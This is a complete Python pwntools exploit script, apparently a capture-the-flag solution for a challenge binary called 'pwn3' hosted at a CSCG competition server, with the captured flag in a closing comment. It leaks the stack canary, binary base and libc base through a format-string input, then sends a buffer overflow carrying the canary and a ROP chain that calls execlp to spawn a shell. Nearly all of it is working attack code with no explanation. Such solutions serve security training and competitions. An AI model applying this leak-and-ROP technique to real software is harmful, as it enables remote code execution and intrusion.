#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./pwn3")
libc = ELF("./libc.so.6") if args.REMOTE else exe.libc

r = None
def connect(fresh=True, local=False):
    global r
    if r is not None:
        if fresh:
            r.close()
        else:
            return
    r = remote("hax1.allesctf.net", 9102) if args.REMOTE and not local else exe.process()

connect()

r.sendlineafter("Enter the password of stage 2:", "CSCG{NOW_GET_VOLDEMORT}")
r.sendlineafter("witch name:\n", "cookie %39$p cookiend out %41$p outend libc %45$p libcend")
cookie = int(r.recvuntil(b" cookiend", drop=True).split(b" ")[-1], 16)
info("cookie %#x", cookie)
addr = r.recvuntil(b" outend", drop=True).split(b" ")[-1].decode()
exe.address += int(addr, 16) - (exe.symbols.main + 55)
success("exe base: %#x", exe.address)
addr = r.recvuntil(b" libcend", drop=True).split(b" ")[-1].decode()
libc.address += int(addr, 16) - (libc.symbols.__libc_start_main+243)
success("libc base: %#x", exe.address)

rop = ROP(libc)
rop.call("execlp", (next(libc.search(b"sh\0")), 0))
print(rop.dump())

r.sendlineafter("magic spell:", flat({
    0x0: "Expelliarmus\0" ,
    0x108: cookie,
    0x118: [
        # stack alignment,
        exe.address + 0x9a1,
        rop.chain(),
    ]

}))

r.interactive()
# CSCG{VOLDEMORT_DID_NOTHING_WRONG}
